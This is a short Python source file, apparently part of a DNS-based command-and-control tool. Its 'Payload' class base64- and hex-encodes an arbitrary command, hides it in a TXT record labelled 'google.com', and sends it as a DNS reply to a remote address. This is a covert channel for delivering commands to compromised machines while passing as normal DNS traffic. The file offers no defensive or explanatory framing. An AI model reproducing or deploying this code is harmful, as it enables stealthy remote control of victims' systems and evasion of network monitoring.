import base64
from dnslib import DNSRecord, DNSHeader, RR

class Payload:
    def __init__(self,addr):
        self.addr = addr

    def payload(self,sock,req,com):
        command = com
        command_bytes = command.encode('ascii')
        base_64_bytes = base64.b64encode(command_bytes)
        finalCommand = bytes.hex(base_64_bytes)
        request = DNSRecord.parse(req)
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        reply.add_answer(*RR.fromZone("google.com TXT " + "/" + finalCommand + "/"))
        resp = reply.pack()
        sock.sendto(resp,(self.addr,53))